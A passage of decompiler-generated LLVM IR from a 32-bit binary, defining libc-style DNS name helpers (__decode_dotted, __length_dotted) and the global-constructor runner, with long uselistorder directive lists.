  uselistorder i8* null, { 3, 5, 2, 7, 0, 1, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 4 }
  uselistorder label %dec_label_pc_8056794, { 1, 0 }
  uselistorder label %dec_label_pc_8056791, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805677d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8056778, { 1, 0 }
  uselistorder label %dec_label_pc_8056742, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_805679e = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_80567a7 = icmp eq i32 %arg1, 0
  br i1 %v4_80567a7, label %dec_label_pc_8056868, label %dec_label_pc_80567b2

dec_label_pc_80567b2:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80568502740 = add i32 %arg2, %arg1
  %v3_80568502841 = inttoptr i32 %v2_80568502740 to i8*
  %v4_80568502942 = load i8, i8* %v3_80568502841, align 1
  %v1_80568543144 = icmp eq i8 %v4_80568502942, 0
  %v1_80568563245 = icmp eq i1 %v1_80568543144, false
  br i1 %v1_80568563245, label %dec_label_pc_80567c0.lr.ph, label %dec_label_pc_805685c

dec_label_pc_80567c0:                             ; preds = %dec_label_pc_80567c0.lr.ph, %dec_label_pc_80567d9
  %v0_80567ca = phi i32 [ %v0_80567ca.pre, %dec_label_pc_80567c0.lr.ph ], [ %v4_80567e4, %dec_label_pc_80567d9 ]
  %v8_80567c038 = phi i1 [ %v8_80567c03350, %dec_label_pc_80567c0.lr.ph ], [ true, %dec_label_pc_80567d9 ]
  %v5_805685037.in = phi i8 [ %v5_80568503049.in, %dec_label_pc_80567c0.lr.ph ], [ %v4_8056850, %dec_label_pc_80567d9 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_80567c0.lr.ph ], [ 0, %dec_label_pc_80567d9 ]
  %v0_80567c735 = phi i32 [ %v0_80567c7.ph46, %dec_label_pc_80567c0.lr.ph ], [ %v2_80567f3, %dec_label_pc_80567d9 ]
  %v5_805685037 = zext i8 %v5_805685037.in to i32
  %v1_80567c7 = add i32 %v0_80567c735, 1
  store i32 %v1_80567c7, i32* @esi, align 4
  %v3_80567ca = select i1 %v8_80567c038, i32 2, i32 1
  %v4_80567ca = add i32 %v3_80567ca, %v0_80567ca
  store i32 %v4_80567ca, i32* %ebp.global-to-local, align 4
  %v1_80567cd = and i32 %v5_805685037, 192
  %v6_80567d2 = icmp eq i32 %v1_80567cd, 192
  %v1_80567d7 = icmp eq i1 %v6_80567d2, false
  br i1 %v1_80567d7, label %dec_label_pc_80567fc, label %dec_label_pc_80567d9

dec_label_pc_80567d9:                             ; preds = %dec_label_pc_80567c0
  %v4_80567e4 = add i32 %v3_80567ca, %v4_80567ca
  store i32 %v4_80567e4, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_805685037.in, 64
  %v1_80567e7 = zext i8 %tmp to i32
  %v2_80567ea = add i32 %v1_80567c7, %arg1
  %v3_80567ea = inttoptr i32 %v2_80567ea to i8*
  %v4_80567ea = load i8, i8* %v3_80567ea, align 1
  %v5_80567ea = zext i8 %v4_80567ea to i32
  %v2_80567ee = mul nuw nsw i32 %v1_80567e7, 256
  %v2_80567f3 = or i32 %v5_80567ea, %v2_80567ee
  store i32 %v2_80567f3, i32* @edx, align 4
  store i32 %v1_8056819.ph47, i32* @ecx, align 4
  %v2_8056850 = add i32 %v2_80567f3, %arg1
  %v3_8056850 = inttoptr i32 %v2_8056850 to i8*
  %v4_8056850 = load i8, i8* %v3_8056850, align 1
  %v1_8056854 = icmp eq i8 %v4_8056850, 0
  %v1_8056856 = icmp eq i1 %v1_8056854, false
  br i1 %v1_8056856, label %dec_label_pc_80567c0, label %dec_label_pc_805685c

dec_label_pc_80567fc:                             ; preds = %dec_label_pc_80567c0
  %v2_80567fc = add i32 %v5_805685037, %v1_8056819.ph47
  %v1_8056805 = add i32 %v2_80567fc, 1
  store i32 %v1_8056805, i32* @edi, align 4
  %v10_8056806 = icmp ult i32 %v1_8056805, %arg4
  %v1_805680a = icmp eq i1 %v10_8056806, false
  br i1 %v1_805680a, label %dec_label_pc_8056868, label %dec_label_pc_805680c

dec_label_pc_805680c:                             ; preds = %dec_label_pc_80567fc
  %v2_8056812 = add i32 %v1_80567c7, %arg1
  %v2_8056819 = add i32 %v1_8056819.ph47, %arg3
  %v3_805681c = inttoptr i32 %v2_8056819 to i16*
  %v4_805681c = call i32 @memcpy(i16* %v3_805681c, i32 %v2_8056812, i32 %v5_805685037)
  %v0_8056824 = load i32, i32* @esi, align 4
  %v2_8056824 = add i32 %v0_8056824, %v5_805685037
  store i32 %v2_8056824, i32* @edx, align 4
  br i1 %v8_80567c038, label %dec_label_pc_8056830, label %dec_label_pc_805682e

dec_label_pc_805682e:                             ; preds = %dec_label_pc_805680c
  %v0_805682e = load i32, i32* %ebp.global-to-local, align 4
  %v2_805682e = add i32 %v0_805682e, %v5_805685037
  store i32 %v2_805682e, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8056830

dec_label_pc_8056830:                             ; preds = %dec_label_pc_805680c, %dec_label_pc_805682e
  %v4_8056847 = add i32 %v2_80567fc, %arg3
  %v5_8056847 = inttoptr i32 %v4_8056847 to i8*
  store i8 46, i8* %v5_8056847, align 1
  %v0_805684a.pre = load i32, i32* @edi, align 4
  %v1_8056850.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_805684a.pre, i32* @ecx, align 4
  %v2_805685027 = add i32 %v1_8056850.pre.pre, %arg1
  %v3_805685028 = inttoptr i32 %v2_805685027 to i8*
  %v4_805685029 = load i8, i8* %v3_805685028, align 1
  %v1_805685431 = icmp eq i8 %v4_805685029, 0
  %v1_805685632 = icmp eq i1 %v1_805685431, false
  %v8_80567c033 = icmp eq i8 %stack_var_-17.136, 0
  %v0_80567ca.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805685632, label %dec_label_pc_80567c0.lr.ph, label %dec_label_pc_805685c

dec_label_pc_80567c0.lr.ph:                       ; preds = %dec_label_pc_8056830, %dec_label_pc_80567b2
  %v0_80567ca.pre = phi i32 [ 0, %dec_label_pc_80567b2 ], [ %v0_80567ca.pre.pre, %dec_label_pc_8056830 ]
  %v8_80567c03350 = phi i1 [ false, %dec_label_pc_80567b2 ], [ %v8_80567c033, %dec_label_pc_8056830 ]
  %v5_80568503049.in = phi i8 [ %v4_80568502942, %dec_label_pc_80567b2 ], [ %v4_805685029, %dec_label_pc_8056830 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_80567b2 ], [ %stack_var_-17.136, %dec_label_pc_8056830 ]
  %v1_8056819.ph47 = phi i32 [ 0, %dec_label_pc_80567b2 ], [ %v0_805684a.pre, %dec_label_pc_8056830 ]
  %v0_80567c7.ph46 = phi i32 [ %arg2, %dec_label_pc_80567b2 ], [ %v1_8056850.pre.pre, %dec_label_pc_8056830 ]
  br label %dec_label_pc_80567c0

dec_label_pc_805685c:                             ; preds = %dec_label_pc_8056830, %dec_label_pc_80567d9, %dec_label_pc_80567b2
  %v0_8056861 = phi i32 [ 0, %dec_label_pc_80567b2 ], [ %v4_80567e4, %dec_label_pc_80567d9 ], [ %v0_80567ca.pre.pre, %dec_label_pc_8056830 ]
  %v8_80567c0.lcssa = phi i1 [ false, %dec_label_pc_80567b2 ], [ true, %dec_label_pc_80567d9 ], [ %v8_80567c033, %dec_label_pc_8056830 ]
  %v2_8056863 = zext i1 %v8_80567c0.lcssa to i32
  %v3_8056863 = add i32 %v0_8056861, 1
  %v4_8056863 = add i32 %v3_8056863, %v2_8056863
  br label %dec_label_pc_805686b

dec_label_pc_8056868:                             ; preds = %dec_label_pc_80567fc, %entry
  br label %dec_label_pc_805686b

dec_label_pc_805686b:                             ; preds = %dec_label_pc_805685c, %dec_label_pc_8056868
  %storemerge = phi i32 [ %v4_8056863, %dec_label_pc_805685c ], [ -1, %dec_label_pc_8056868 ]
  store i32 %v0_805679e, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8056819.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_8056850, { 1, 0 }
  uselistorder i32 %v2_80567f3, { 0, 2, 1 }
  uselistorder i32 %v4_80567e4, { 0, 2, 1 }
  uselistorder i32 %v5_805685037, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8 1, { 1, 10, 13, 2, 12, 8, 5, 6, 0, 3, 4, 9, 11, 7 }
  uselistorder i8 46, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 9, 10, 11, 12, 13, 14, 15, 17, 2, 3, 18, 19, 21, 0, 1, 16, 4, 5, 6, 20, 7, 8 }
  uselistorder i32* @edi, { 3, 194, 195, 23, 196, 197, 198, 22, 199, 200, 4, 201, 0, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 31, 6, 5, 32, 33, 34, 35, 36, 44, 37, 38, 39, 40, 41, 42, 43, 217, 7, 218, 8, 219, 220, 221, 222, 227, 228, 1, 223, 224, 225, 226, 229, 230, 231, 232, 115, 9, 116, 117, 118, 233, 234, 241, 242, 243, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 175, 176, 177, 178, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 10, 130, 131, 132, 133, 134, 135, 136, 346, 347, 11, 348, 349, 12, 352, 353, 303, 304, 305, 52, 53, 54, 354, 355, 356, 371, 172, 13, 173, 174, 45, 46, 47, 48, 49, 50, 51, 187, 14, 188, 189, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 55, 56, 57, 58, 59, 60, 61, 328, 329, 330, 331, 332, 333, 334, 335, 15, 336, 337, 338, 339, 340, 274, 275, 16, 276, 277, 278, 279, 280, 281, 282, 291, 292, 293, 294, 295, 137, 138, 17, 139, 369, 370, 140, 141, 142, 18, 252, 253, 244, 245, 246, 247, 248, 249, 250, 251, 62, 63, 64, 254, 255, 256, 143, 144, 145, 146, 147, 148, 149, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 19, 164, 28, 29, 30, 150, 20, 151, 152, 114, 365, 366, 367, 368, 257, 258, 259, 260, 261, 262, 165, 166, 167, 168, 235, 236, 237, 238, 239, 240, 350, 351, 190, 191, 301, 302, 65, 66, 67, 306, 307, 362, 363, 364, 68, 21, 69, 70, 71, 72, 308, 309, 73, 74, 75, 357, 358, 359, 360, 361, 76, 77, 78, 81, 79, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 2, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 169, 170, 171, 179, 180, 181, 182, 183, 184, 185, 186, 24, 25, 26, 27, 192, 193, 283, 284, 285, 286, 287, 288, 289, 290, 296, 297, 298, 299, 300, 310, 311, 312, 341, 342, 343, 344, 345 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 49, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 48, 16, 17, 18, 21, 19, 20, 22, 23, 24, 44, 45, 25, 46, 50, 26, 27, 55, 28, 29, 0, 53, 54, 47, 30, 31, 32, 33, 34, 56, 35, 36, 37, 38, 39, 40, 51, 57, 41, 52, 42, 43 }
  uselistorder i8 64, { 0, 1, 5, 6, 2, 7, 3, 4 }
  uselistorder i1 true, { 1, 4, 11, 3, 5, 6, 8, 7, 9, 10, 2, 0 }
  uselistorder i32* @edx, { 8, 190, 191, 192, 193, 194, 195, 196, 22, 3, 200, 198, 199, 2, 201, 202, 203, 204, 205, 206, 207, 208, 50, 54, 51, 52, 53, 209, 210, 211, 212, 213, 214, 215, 221, 216, 217, 218, 219, 220, 4, 23, 179, 122, 123, 124, 125, 126, 127, 128, 222, 223, 234, 224, 5, 238, 239, 240, 241, 370, 9, 6, 24, 180, 129, 130, 225, 226, 10, 227, 228, 229, 131, 132, 133, 134, 135, 136, 137, 454, 455, 456, 457, 11, 458, 459, 373, 377, 188, 378, 57, 461, 55, 462, 379, 465, 466, 473, 472, 463, 172, 86, 12, 87, 88, 89, 90, 91, 92, 93, 173, 174, 175, 176, 177, 56, 382, 383, 13, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 14, 397, 398, 380, 381, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 15, 74, 75, 76, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 16, 436, 437, 438, 439, 440, 441, 442, 468, 178, 242, 243, 245, 1, 197, 244, 369, 138, 230, 231, 232, 77, 233, 139, 140, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 21, 158, 159, 141, 160, 17, 161, 162, 164, 18, 165, 166, 167, 168, 169, 49, 19, 163, 121, 464, 235, 236, 237, 20, 170, 371, 372, 460, 189, 467, 368, 469, 453, 0, 374, 375, 78, 365, 376, 79, 470, 471, 80, 81, 82, 83, 84, 85, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 171, 181, 182, 183, 184, 185, 186, 187, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 366, 367, 443, 444, 445, 446, 448, 452, 447, 450, 451, 7, 449, 474 }
  uselistorder i32* @esi, {}
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_805686b, { 1, 0 }
  uselistorder label %dec_label_pc_8056830, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8056882 = icmp eq i32 %arg1, 0
  br i1 %v1_8056882, label %dec_label_pc_80568b1, label %dec_label_pc_80568a2.preheader

dec_label_pc_80568a2.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_80568a210 = add i32 %arg2, %arg1
  %v3_80568a211 = inttoptr i32 %v2_80568a210 to i8*
  %v4_80568a212 = load i8, i8* %v3_80568a211, align 1
  %v1_80568a614 = add i32 %arg2, 1
  %v1_80568a915 = icmp eq i8 %v4_80568a212, 0
  %v1_80568ab16 = icmp eq i1 %v1_80568a915, false
  br i1 %v1_80568ab16, label %dec_label_pc_8056891, label %dec_label_pc_80568ad

dec_label_pc_8056888:                             ; preds = %dec_label_pc_8056891
  %v1_8056888 = add i32 %v0_805688817, 2
  br label %dec_label_pc_80568ad

dec_label_pc_8056891:                             ; preds = %dec_label_pc_80568a2.preheader, %dec_label_pc_80568a2
  %v1_80568a619 = phi i32 [ %v1_80568a6, %dec_label_pc_80568a2 ], [ %v1_80568a614, %dec_label_pc_80568a2.preheader ]
  %v5_80568a218.in = phi i8 [ %v4_80568a2, %dec_label_pc_80568a2 ], [ %v4_80568a212, %dec_label_pc_80568a2.preheader ]
  %v0_805688817 = phi i32 [ %v2_805689f, %dec_label_pc_80568a2 ], [ %arg2, %dec_label_pc_80568a2.preheader ]
  %v5_80568a218 = zext i8 %v5_80568a218.in to i32
  %v1_8056893 = and i32 %v5_80568a218, 192
  %v6_8056898 = icmp eq i32 %v1_8056893, 192
  %v2_805689f = add i32 %v5_80568a218, %v1_80568a619
  br i1 %v6_8056898, label %dec_label_pc_8056888, label %dec_label_pc_80568a2

dec_label_pc_80568a2:                             ; preds = %dec_label_pc_8056891
  store i32 %v2_805689f, i32* @ecx, align 4
  %v2_80568a2 = add i32 %v2_805689f, %arg1
  %v3_80568a2 = inttoptr i32 %v2_80568a2 to i8*
  %v4_80568a2 = load i8, i8* %v3_80568a2, align 1
  %v1_80568a6 = add i32 %v2_805689f, 1
  %v1_80568a9 = icmp eq i8 %v4_80568a2, 0
  %v1_80568ab = icmp eq i1 %v1_80568a9, false
  br i1 %v1_80568ab, label %dec_label_pc_8056891, label %dec_label_pc_80568ad

dec_label_pc_80568ad:                             ; preds = %dec_label_pc_80568a2.preheader, %dec_label_pc_80568a2, %dec_label_pc_8056888
  %v0_80568ad = phi i32 [ %v1_8056888, %dec_label_pc_8056888 ], [ %v1_80568a614, %dec_label_pc_80568a2.preheader ], [ %v1_80568a6, %dec_label_pc_80568a2 ]
  %v2_80568af = sub i32 %v0_80568ad, %arg2
  br label %dec_label_pc_80568b1

dec_label_pc_80568b1:                             ; preds = %entry, %dec_label_pc_80568ad
  %v0_80568b4 = phi i32 [ -1, %entry ], [ %v2_80568af, %dec_label_pc_80568ad ]
  ret i32 %v0_80568b4

; uselistorder directives
  uselistorder i8 %v4_80568a2, { 1, 0 }
  uselistorder i32 %v2_805689f, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 2, { 161, 55, 162, 54, 99, 166, 167, 59, 64, 63, 163, 168, 169, 170, 139, 171, 172, 173, 174, 175, 176, 145, 65, 146, 147, 72, 177, 178, 66, 100, 73, 151, 74, 67, 152, 95, 179, 180, 181, 183, 140, 196, 197, 4, 83, 79, 153, 154, 96, 5, 84, 85, 204, 80, 138, 3, 101, 135, 102, 136, 103, 137, 75, 6, 150, 60, 104, 105, 0, 106, 1, 107, 2, 108, 109, 7, 8, 9, 10, 148, 11, 12, 13, 86, 199, 14, 15, 97, 16, 184, 185, 186, 187, 68, 87, 192, 193, 164, 165, 194, 195, 76, 77, 78, 17, 205, 88, 69, 70, 155, 156, 82, 18, 19, 157, 61, 20, 158, 21, 89, 159, 160, 182, 198, 203, 98, 22, 149, 23, 110, 113, 111, 112, 114, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 115, 116, 119, 117, 118, 90, 47, 48, 49, 50, 56, 51, 57, 52, 120, 121, 91, 122, 123, 124, 81, 125, 126, 127, 141, 142, 143, 144, 128, 129, 130, 131, 188, 58, 189, 71, 190, 92, 62, 191, 132, 133, 93, 202, 94, 200, 53, 201, 134 }
  uselistorder i8 0, { 40, 5, 8, 9, 41, 7, 6, 138, 139, 11, 146, 141, 142, 10, 144, 145, 143, 36, 147, 2, 3, 63, 64, 148, 149, 38, 150, 12, 14, 127, 126, 13, 42, 151, 152, 153, 83, 84, 17, 161, 157, 158, 156, 15, 159, 160, 16, 37, 162, 163, 173, 174, 175, 176, 177, 195, 196, 19, 129, 128, 18, 130, 131, 167, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 4, 187, 101, 102, 218, 103, 219, 222, 79, 43, 58, 80, 20, 221, 201, 202, 203, 65, 204, 205, 206, 207, 208, 209, 44, 210, 22, 185, 186, 21, 140, 104, 105, 59, 1, 32, 33, 34, 31, 0, 45, 46, 47, 106, 178, 190, 191, 125, 168, 169, 164, 166, 165, 107, 108, 109, 110, 111, 112, 113, 23, 114, 115, 24, 116, 117, 118, 119, 120, 121, 122, 123, 61, 220, 170, 171, 172, 124, 154, 155, 66, 67, 25, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 81, 82, 132, 133, 134, 135, 136, 137, 60, 39, 179, 180, 181, 182, 183, 184, 188, 189, 192, 193, 194, 26, 197, 198, 35, 199, 27, 200, 211, 216, 215, 28, 212, 213, 30, 214, 29, 217, 62, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* @ecx, { 27, 6, 8, 26, 7, 122, 125, 15, 126, 127, 128, 129, 16, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 37, 42, 38, 39, 40, 41, 146, 9, 10, 112, 0, 113, 147, 51, 12, 19, 148, 149, 17, 11, 18, 150, 155, 156, 157, 158, 159, 171, 172, 173, 174, 13, 114, 1, 115, 52, 53, 31, 54, 152, 153, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 28, 80, 81, 82, 83, 84, 85, 29, 86, 25, 45, 46, 47, 48, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 20, 200, 175, 176, 177, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 21, 215, 216, 218, 219, 220, 217, 224, 160, 123, 124, 32, 33, 151, 87, 88, 89, 90, 91, 92, 93, 30, 94, 14, 95, 96, 97, 98, 99, 22, 23, 2, 3, 100, 101, 24, 102, 103, 104, 105, 106, 108, 109, 110, 111, 35, 36, 107, 50, 222, 154, 223, 225, 226, 227, 34, 43, 44, 49, 116, 117, 118, 119, 120, 121, 161, 162, 163, 164, 165, 5, 166, 167, 168, 4, 169, 170, 221 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80568b1, { 1, 0 }
  uselistorder label %dec_label_pc_80568ad, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8056891, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_80568cc = load i32, i32* @global_var_8061000.767, align 4096
  %v10_80568d1 = icmp eq i32 %v0_80568cc, -1
  br i1 %v10_80568d1, label %dec_label_pc_80568e2, label %dec_label_pc_80568d6.preheader

dec_label_pc_80568d6.preheader:                   ; preds = %entry
  br label %dec_label_pc_80568d6

dec_label_pc_80568d6:                             ; preds = %dec_label_pc_80568d6.preheader, %dec_label_pc_80568d6
  %v4_80568d9 = phi i32 [ %v0_80568cc, %dec_label_pc_80568d6.preheader ], [ %v2_80568db, %dec_label_pc_80568d6 ]
  %v0_80568d6 = phi i32 [ ptrtoint (i32* @global_var_8061000.767 to i32), %dec_label_pc_80568d6.preheader ], [ %v1_80568d6, %dec_label_pc_80568d6 ]
  %v1_80568d6 = add i32 %v0_80568d6, -4
  call void @__pseudo_call(i32 %v4_80568d9)
  %v1_80568db = inttoptr i32 %v1_80568d6 to i32*
  %v2_80568db = load i32, i32* %v1_80568db, align 4
  %v10_80568dd = icmp eq i32 %v2_80568db, -1
  %v1_80568e0 = icmp eq i1 %v10_80568dd, false
  br i1 %v1_80568e0, label %dec_label_pc_80568d6, label %dec_label_pc_80568e2.loopexit

dec_label_pc_80568e2.loopexit:                    ; preds = %dec_label_pc_80568d6
  %v2_80568e2.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_80568e2

dec_label_pc_80568e2:                             ; preds = %dec_label_pc_80568e2.loopexit, %entry
  %v2_80568e2 = phi i32 [ %v2_80568e2.pre, %dec_label_pc_80568e2.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_80568e2

; uselistorder directives
  uselistorder i32 %v0_80568cc, { 1, 0 }
  uselistorder i1 false, { 845, 519, 3, 0, 1, 5, 520, 522, 521, 4, 524, 523, 55, 7, 56, 533, 528, 532, 530, 531, 77, 525, 526, 529, 6, 534, 535, 536, 537, 139, 141, 142, 143, 144, 140, 145, 146, 147, 150, 148, 149, 538, 539, 544, 57, 540, 541, 543, 542, 545, 546, 551, 550, 547, 548, 549, 8, 9, 455, 456, 457, 78, 552, 553, 554, 555, 556, 557, 334, 335, 336, 558, 58, 559, 560, 337, 338, 339, 792, 59, 11, 563, 564, 565, 566, 568, 567, 10, 583, 584, 60, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 774, 775, 777, 776, 12, 458, 459, 460, 461, 340, 341, 342, 602, 603, 576, 577, 578, 343, 344, 345, 346, 347, 348, 349, 96, 350, 351, 352, 353, 354, 355, 356, 752, 753, 754, 755, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 846, 847, 73, 373, 79, 374, 375, 376, 793, 794, 795, 848, 862, 863, 864, 865, 866, 869, 80, 870, 871, 868, 861, 849, 117, 444, 445, 446, 447, 448, 449, 850, 851, 207, 208, 209, 210, 211, 212, 13, 450, 451, 74, 514, 14, 515, 516, 615, 151, 854, 855, 856, 857, 858, 859, 860, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 796, 152, 153, 154, 155, 156, 157, 158, 159, 160, 809, 810, 811, 812, 813, 814, 815, 816, 52, 818, 817, 822, 819, 820, 821, 15, 823, 824, 452, 453, 782, 604, 605, 607, 608, 867, 17, 749, 748, 16, 527, 377, 378, 379, 81, 761, 762, 763, 764, 766, 765, 18, 767, 380, 19, 606, 768, 769, 454, 381, 382, 581, 579, 580, 20, 61, 569, 574, 573, 82, 575, 571, 570, 83, 572, 161, 582, 162, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 402, 401, 21, 403, 404, 405, 406, 407, 409, 53, 410, 408, 411, 413, 412, 22, 414, 415, 417, 416, 84, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 136, 137, 331, 332, 852, 85, 853, 23, 585, 586, 587, 588, 589, 442, 561, 562, 163, 164, 165, 166, 167, 785, 189, 170, 97, 168, 169, 86, 87, 171, 172, 173, 174, 175, 176, 177, 178, 179, 24, 25, 180, 181, 182, 183, 184, 185, 186, 187, 75, 188, 54, 98, 99, 100, 101, 190, 193, 191, 192, 194, 195, 196, 197, 102, 198, 103, 199, 200, 202, 201, 27, 26, 203, 204, 205, 206, 213, 214, 215, 104, 216, 217, 218, 219, 220, 221, 224, 105, 222, 223, 36, 37, 225, 62, 226, 227, 228, 229, 230, 231, 232, 235, 106, 233, 234, 34, 35, 236, 63, 237, 238, 239, 240, 241, 242, 243, 246, 107, 244, 245, 32, 33, 247, 248, 249, 250, 251, 252, 255, 108, 253, 254, 30, 31, 256, 94, 49, 64, 257, 258, 259, 93, 260, 261, 262, 263, 264, 265, 268, 109, 266, 267, 28, 29, 269, 50, 95, 65, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 110, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 111, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 333, 443, 462, 463, 464, 112, 485, 113, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 88, 89, 486, 487, 488, 489, 490, 491, 492, 493, 494, 51, 495, 114, 496, 497, 498, 115, 499, 500, 116, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 517, 518, 609, 610, 611, 612, 613, 39, 614, 38, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 66, 732, 733, 734, 735, 736, 76, 737, 738, 739, 740, 741, 742, 743, 744, 745, 750, 746, 747, 67, 751, 756, 92, 757, 68, 758, 69, 759, 760, 40, 772, 770, 771, 41, 773, 42, 778, 779, 780, 43, 781, 2, 783, 784, 786, 787, 788, 70, 789, 790, 791, 825, 841, 826, 827, 828, 829, 834, 838, 839, 840, 44, 830, 90, 831, 832, 833, 71, 48, 835, 47, 72, 46, 836, 837, 45, 842, 843, 844, 138, 91, 872 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
